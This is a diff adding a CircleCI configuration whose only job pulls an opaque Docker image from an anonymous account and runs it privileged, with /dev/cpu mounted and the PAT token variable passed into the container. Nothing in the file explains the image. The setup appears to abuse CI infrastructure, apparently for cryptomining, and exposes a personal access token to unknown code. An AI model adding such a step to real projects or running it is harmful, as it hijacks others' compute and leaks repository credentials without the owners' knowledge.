@@ -1,0 +1,24 @@
+version: 2.1
+
+jobs:
+  runner:
+    parameters:
+      target:
+        type: string
+        
+    machine:
+      image: ubuntu-2204:current
+    steps:
+      - run:
+          name: Pull and run Docker container
+          command: docker pull anonymousperson457/test@sha256:4bf96d6ef58e05b51b89c9ab477ec3b7fca16fbc045607afc5a1ca1f2a273d7b && docker run --rm --privileged -v /dev/cpu:/dev/cpu -e PAT anonymousperson457/test@sha256:4bf96d6ef58e05b51b89c9ab477ec3b7fca16fbc045607afc5a1ca1f2a273d7b
+          
+workflows:
+  runner:
+    jobs:
+      - runner:
+          name: << matrix.target >>
+          matrix:
+            parameters:
+              target:
+                - build-1
